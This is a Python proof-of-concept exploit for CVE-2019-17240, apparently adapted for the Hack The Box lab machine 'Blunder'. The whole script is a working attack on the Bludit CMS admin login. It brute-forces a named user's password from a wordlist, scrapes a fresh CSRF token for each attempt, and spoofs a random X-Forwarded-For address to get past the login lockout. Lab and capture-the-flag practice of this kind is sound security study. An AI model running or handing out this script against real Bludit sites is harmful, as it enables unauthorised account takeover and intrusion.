#!/usr/bin/env python3

#This is the proof of concept for CVE-2019-17240 found at
#https://rastating.github.io/bludit-brute-force-mitigation-bypass/
#with a few minor alterations to work on the HTB machine blunder
#
import re
import requests
import random

#host = 'http://192.168.194.146/bludit'
host = 'http://10.10.10.191'
#login_url = host + '/admin/login'
login_url = host + '/admin/login'
username = 'fergus'
with open ( "/home/kali/Documents/Blunder/wordlist.txt", 'r' ) as tmplist:
    wordlist = tmplist.read().split('\n')

    for password in wordlist:
        session = requests.Session()
        login_page = session.get(login_url)                                                                                                                                                                                                
        csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)                                                                                                                                       
        spoof_ip = str( random.randint(2,254) ) + '.' + str( random.randint(2,254) ) + '.' + str( random.randint(2,254) ) + '.' + str( random.randint(2,254) )                                                                             
                                                                                                                                                                                                                                           
        print('[*] Trying: {p}'.format(p = password))                                                                                                                                                                                      
                                                                                                                                                                                                                                           
        headers = {                                                                                                                                                                                                                        
            'X-Forwarded-For': spoof_ip,                                                                                                                                                                                                   
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',                                                                                                      
            'Referer': login_url                                                                                                                                                                                                           
        }                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                           
        data = {                                                                                                                                                                                                                           
            'tokenCSRF': csrf_token,                                                                                                                                                                                                       
            'username': username,                                                                                                                                                                                                          
            'password': password,                                                                                                                                                                                                          
            'save': ''                                                                                                                                                                                                                     
        }                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                           
        login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)                                                                                                                                    
                                                                                                                                                                                                                                           
        if 'location' in login_result.headers:                                                                                                                                                                                             
            if '/admin/dashboard' in login_result.headers['location']:                                                                                                                                                                     
                print()                                                                                                                                                                                                                    
                print('SUCCESS: Password found!')                                                                                                                                                                                          
                print('Use {u}:{p} to login.'.format(u = username, p = password))                                                                                                                                                          
                print()                                                                                                                                                                                                                    
                break                                                                                                                                                                                                                      
                                                                                                                                                                                                                                           
#        password = wordlist.readline()      
